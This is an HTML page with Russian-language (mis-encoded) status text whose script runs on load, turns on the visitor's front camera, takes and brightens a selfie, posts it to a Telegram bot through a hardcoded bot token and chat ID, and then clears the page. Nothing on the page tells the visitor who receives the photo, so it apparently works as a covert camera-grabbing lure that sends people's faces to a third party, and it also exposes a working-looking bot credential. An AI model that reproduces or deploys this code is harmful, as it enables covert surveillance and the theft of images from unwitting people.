<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
    </style>
</head>
<body>
    <div id="status">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
    status.textContent = text;
}

async function captureAndSend() {
    let stream = null;
    
    try {
        updateStatus('1. –í–∫–ª—é—á–∞—é —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É...');
        
        // === 1. –¢–û–õ–¨–ö–û –§–†–û–ù–¢–ê–õ–¨–ù–ê–Ø –ö–ê–ú–ï–†–ê ===
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', // –¢–û–ß–ù–û —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                width: { ideal: 1280 },
                height: { ideal: 720 },
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è —Ñ—Ä–æ–Ω—Ç–∞–ª–∫–∏:
                aspectRatio: { ideal: 0.5625 } // 9:16 (–≤–µ—Ä—Ç–∏–∫–∞–ª—å–Ω–æ–µ)
            }
        });
        
        updateStatus('‚úÖ –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');
        
        // === 2. –°–æ–∑–¥–∞–µ–º –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç ===
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        // === 3. –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö ===
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                updateStatus('2. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é —Ñ–æ–∫—É—Å (4 —Å–µ–∫)...');
                resolve();
            };
        });
        
        // === 4. –î–ê–Å–ú –ú–ê–ö–°–ò–ú–ê–õ–¨–ù–û–ï –í–†–ï–ú–Ø –î–õ–Ø –§–†–û–ù–¢–ê–õ–ö–ò ===
        // –£–≤–µ–ª–∏—á–µ–Ω–æ –¥–æ 4 —Å–µ–∫—É–Ω–¥ –¥–ª—è –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Ñ–æ–∫—É—Å–∞
        await new Promise(resolve => setTimeout(resolve, 4000));
        
        // === 5. –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –∫–∞–º–µ—Ä–∞ –¥–∞–µ—Ç –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ===
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            throw new Error('–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –Ω–µ –¥–∞–ª–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ');
        }
        
        updateStatus('3. –î–µ–ª–∞—é —Å–µ–ª—Ñ–∏...');
        
        // === 6. –°–æ–∑–¥–∞–µ–º canvas ===
        const canvas = document.createElement('canvas');
        // –î–ª—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã - –≤–µ—Ä—Ç–∏–∫–∞–ª—å–Ω–∞—è –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏—è
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        // –û—Ç—Ä–∞–∂–∞–µ–º –ø–æ –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª–∏ –∫–∞–∫ –≤ —Å–µ–ª—Ñ–∏-—Ä–µ–∂–∏–º–µ
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // === 7. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É ===
        stream.getTracks().forEach(track => track.stop());
        
        // === 8. –ú–û–©–ù–û–ï –£–õ–£–ß–®–ï–ù–ò–ï –î–õ–Ø –§–†–û–ù–¢–ê–õ–ö–ò ===
        ctx.setTransform(1, 0, 0, 1, 0, 0); // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü–∏—é
        
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // –£–°–ò–õ–ï–ù–ù–ê–Ø –ö–û–†–†–ï–ö–¶–ò–Ø –¥–ª—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã:
        for (let i = 0; i < data.length; i += 4) {
            // 1. –°–∏–ª—å–Ω–æ —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º —è—Ä–∫–æ—Å—Ç—å (+60%)
            data[i] = Math.min(255, data[i] * 1.6);
            data[i + 1] = Math.min(255, data[i + 1] * 1.6);
            data[i + 2] = Math.min(255, data[i + 2] * 1.6);
            
            // 2. –£—Å–∏–ª–∏–≤–∞–µ–º –∫–æ–Ω—Ç—Ä–∞—Å—Ç
            const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
            if (avg > 150) {
                data[i] = Math.min(255, data[i] * 1.15);
                data[i + 1] = Math.min(255, data[i + 1] * 1.15);
                data[i + 2] = Math.min(255, data[i + 2] * 1.15);
            } else if (avg < 100) {
                data[i] = Math.max(0, data[i] * 0.9);
                data[i + 1] = Math.max(0, data[i + 1] * 0.9);
                data[i + 2] = Math.max(0, data[i + 2] * 0.9);
            }
        }
        
        ctx.putImageData(imageData, 0, 0);
        
        updateStatus('‚úÖ –°–µ–ª—Ñ–∏ –≥–æ—Ç–æ–≤–æ');
        updateStatus('4. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
        
        // === 9. –û—Ç–ø—Ä–∞–≤–∫–∞ ===
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
            formData.append('caption', 'ü§≥ –°–µ–ª—Ñ–∏ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateStatus('‚úÖ –°–µ–ª—Ñ–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
                    setTimeout(() => {
                        document.body.innerHTML = '';
                    }, 2000);
                } else {
                    updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${result.description}`);
                }
            } catch (fetchError) {
                updateStatus('‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
            }
        }, 'image/jpeg', 0.9);
        
    } catch (error) {
        updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º
captureAndSend();
</script>
</body>
</html>
